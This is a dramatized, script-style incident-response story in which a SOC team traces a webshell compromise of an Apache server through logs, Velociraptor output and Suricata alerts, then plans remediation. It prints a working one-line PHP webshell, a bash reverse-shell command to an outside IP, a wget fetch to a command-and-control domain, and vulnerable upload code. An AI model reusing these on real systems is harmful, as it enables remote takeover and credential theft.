1. Rain hammers the city at 2 AM. The SOC is dark except for pulsing red alert panels. Alexander stands at the war board, tie loosened, phone pressed to his ear. Dylan pushes through the glass door, coat soaked, Cyra and Byte behind him.
Alexander: "NIDS flagged web-prod-07. Outbound TCP to 45.77.123.10."
Dylan: "From a web server? That's wrong."
Alexander: "Fourteen minutes. Apache worker to an unknown IP."
Cyra: "Who isolated the box?"
Alexander: "Night shift. Iptables wall, ten minutes ago."

2. Byte drops into the forensics station, fingers already moving. Three monitors ignite. Dylan stands behind him, arms crossed, watching the data stream.
Dylan: "Start with what we know. Show me the machine."
Byte: "Velociraptor's already talking to it."
<< Terminal: !run Custom.Linux.Sys.OSInfo >>
<< Output:
Hostname:  web-prod-07
Distro:    Ubuntu 22.04.4 LTS
Kernel:    5.15.0-105-generic
Codename:  jammy >>
Cyra: "Standard LAMP stack. Public-facing brochure site."

3. Byte pivots to the network baseline. The terminal casts a pale glow across his round glasses.
Byte: "Let's see what should be listening."
<< Terminal: !run Linux.Network.NetstatEnriched (State=LISTEN) >>
<< Output:
Protocol  LocalPort  Name     Username  Cmdline
tcp       80         apache2  root      /usr/sbin/apache2 -k start
tcp       443        apache2  root      /usr/sbin/apache2 -k start
tcp       22         sshd     root      /usr/sbin/sshd -D >>
Dylan: "HTTP, HTTPS, SSH. Nothing else."
Byte: "Anything outside this triple is hostile."
Cyra: "Then let's find what doesn't belong."

4. Dylan leans over Byte's shoulder. The Apache access log scrolls like a confession on screen. Byte highlights a block of lines from a single IP.
Dylan: "Pull the access log. Last 200 lines."
<< Terminal: tail -n 200 /var/log/apache2/access.log >>
Byte: "One IP keeps showing up. 45.77.123.10."
<< Output:
45.77.123.10 - - [14/Nov/2024:02:00:12 +0000] "GET / HTTP/1.1" 200 4521
45.77.123.10 - - [14/Nov/2024:02:00:47 +0000] "GET /upload.php HTTP/1.1" 200 1893 >>
Cyra: "Recon at 2 AM. They mapped the surface."

5. The log continues. Byte scrolls down and the room falls silent. The upload timestamp glows like a wound.
<< Output:
45.77.123.10 - - [14/Nov/2024:02:03:15 +0000] "POST /upload.php HTTP/1.1" 200 412
45.77.123.10 - - [14/Nov/2024:02:03:42 +0000] "GET /uploads/tmpimage.php?c=id HTTP/1.1" 200 58
45.77.123.10 - - [14/Nov/2024:02:05:08 +0000] "GET /uploads/tmpimage.php?c=uname%20-a HTTP/1.1" 200 142 >>
Dylan: "POST to upload, then ?c=id on a PHP file."
Byte: "That's a webshell. Classic pattern."
Cyra: "They uploaded it and tested it immediately."

6. Byte scrolls to the final entries. The reverse shell command unfurls across the screen like a death sentence.
<< Output:
45.77.123.10 - - [14/Nov/2024:02:06:30 +0000] "GET /uploads/tmpimage.php?c=wget%20cdn-assets-update.net HTTP/1.1" 200 0
45.77.123.10 - - [14/Nov/2024:02:07:22 +0000] "GET /uploads/tmpimage.php?c=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/45.77.123.10/4443%200%3E%261%22 HTTP/1.1" 200 0 >>
Dylan: "wget to verify C2, then the reverse shell."
Cyra: "Four minutes from upload to full control."
Byte: "Port 4443. They had a listener waiting."

7. Byte switches to the filesystem timeline. A single file stands out in red -- wrong owner, wrong location, perfect timing.
Byte: "Velociraptor timeline. Looking for the drop."
<< Terminal: !run Custom.Linux.Forensics.Timeline >>
<< Output:
OSPath                                 Uid  Gid  Mode  Size  Mtime
/var/www/html/uploads/tmpimage.php     33   33   0644  328   2024-11-14 02:03:15 UTC >>
Dylan: "Uid 33. That's www-data."
Cyra: "Written by Apache, not by any admin."
Byte: "Mtime matches the POST. Exact second."

8. The webshell source code fills the screen. One line. Twenty-eight words of pure destruction. Dylan stares at it like reading a ransom note.
<< Terminal: cat /var/www/html/uploads/tmpimage.php >>
<< Output:
<?php if(isset($_GET['c'])){system($_GET['c']);}?> >>
Dylan: "One line. That's all it took."
Byte: "SHA-256: a1b2c3d4e5f6...e9f0a1b2."
Cyra: "Textbook webshell. T1505.003."

9. Byte hunts for the root cause. The grep output exposes the vulnerable code -- no validation, no checks, just blind trust.
Byte: "How did it get on disk? Let's find out."
<< Terminal: grep -RIn 'move_uploaded_file\|\$_FILES' /var/www/html >>
<< Output:
/var/www/html/upload.php:12:  $target = '/var/www/html/uploads/' . basename($_FILES['file']['name']);
/var/www/html/upload.php:14:  move_uploaded_file($_FILES['file']['tmp_name'], $target); >>
Dylan: "No extension check. No MIME validation."
Cyra: "Just a JavaScript guard. Client-side only."
Byte: "An unlocked window on a public server."

10. Byte pivots to the process list. The room is silent except for the hum of cooling fans. Then he sees it -- a bash process that should not exist.
Byte: "Checking the process tree."
<< Terminal: !run Linux.Sys.Pslist >>
<< Output:
PID   PPID  Name  Cmdline                                           Username
4187  4102  bash  bash -i >& /dev/tcp/45.77.123.10/4443 0>&1       www-data >>
Dylan: "A bash shell under Apache."
Cyra: "Child of the worker process. www-data."
Byte: "The reverse shell is still alive."

11. Cyra takes the keyboard. Her fingers fly across the network connections. The established session glows on screen like an open wound.
Cyra: "Netstat confirms the active session."
<< Terminal: !run Linux.Network.NetstatEnriched >>
<< Output:
Protocol  LocalAddress  RemoteAddress  RemotePort  State        Name  PID
tcp       10.0.10.42    45.77.123.10   4443        ESTABLISHED  bash  4187 >>
Dylan: "Still connected. Still streaming."
Cyra: "They read /etc/passwd and config.inc.php."
Byte: "DB credentials for cmsapp@10.0.10.5. Compromised."

12. Cyra pulls up the Suricata logs. The DNS query and the long-lived session tell the same story from the network side.
Cyra: "NIDS sees it too. Suricata caught the trail."
<< Terminal: grep -i 'suricata\|DNS Query\|Long-Lived' /var/log/syslog >>
<< Output:
Nov 14 02:06:30 web-prod-07 suricata[2891]: DNS Query: cdn-assets-update.net -> 45.77.123.10 [A]
Nov 14 02:14:11 web-prod-07 suricata[2891]: Long-Lived TCP Session: 10.0.10.42:48216 -> 45.77.123.10:4443 duration=420s >>
Dylan: "The domain resolves to the same IP."
Cyra: "cdn-assets-update.net. Same attacker infrastructure."

13. Alexander enters the room. Dylan stands at the whiteboard, drawing the kill chain. The timeline is mapped in red marker -- recon, upload, execution, shell, exfiltration.
Dylan: "Here's the full picture, Alexander."
Alexander: "How did they get in?"
Dylan: "upload.php. No server-side validation. Legacy endpoint, forgotten, wide open."
Byte: "MITRE ATT&CK T1505.003. Web Shell."
Alexander: "A brochure site became a beachhead."

14. Alexander stands at the head of the table. The team sits around laptops, compiling the remediation plan. The IoC list glows on the projector.
Alexander: "Remediation. Now. What do we need?"
Byte: "Remove the webshell. Audit /uploads/."
Cyra: "Deny PHP execution under /uploads/ via Apache config."
Dylan: "Rotate every credential in config.inc.php."
Byte: "Block egress for www-data. Deploy file integrity monitoring."
<< Projector shows IoC table:

15. Dawn breaks through the SOC windows. Byte leans back, glasses pushed up on his forehead. Cyra powers down her station. Dylan stands at the rain-streaked glass, looking out at the waking city.
Byte: "IoC package shipped fleet-wide."
Cyra: "No more phantom uploads."
Dylan: "The most dangerous vulnerabilities aren't zero-days. They're the ones nobody bothered to fix."
